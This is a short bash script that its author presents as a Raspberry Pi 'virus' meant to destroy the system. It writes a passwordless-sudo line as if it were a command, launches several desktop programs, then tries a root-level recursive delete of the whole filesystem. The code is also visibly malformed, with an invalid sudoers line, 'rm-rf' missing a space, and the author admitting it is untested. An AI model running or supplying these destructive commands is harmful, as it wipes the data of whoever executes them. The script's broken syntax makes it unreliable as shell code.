#!/bin/bash
# One of the First Raspberry Pi Viruses 
# Welp enjoy killing your Raspberry Pi
# It should work with most raspberry pis
# if it doesnt work replace pi with your username on your pc
# not-tested-for-obvious-reasons



# So that we get root permissions [most pi's our just called pi]

pi ALL=(ALL) NOPASSWD: ALL
echo "KillMyPi"
echo "RUNNING"



# Alot of programs to make sure it dies

sh penguinpuzzle
sh gimp
sh midori
sh chromium-browser
sh geany



# and finally the code that will end it once and for all

cd /
sudo rm-rf /
echo "good bye cruel world"
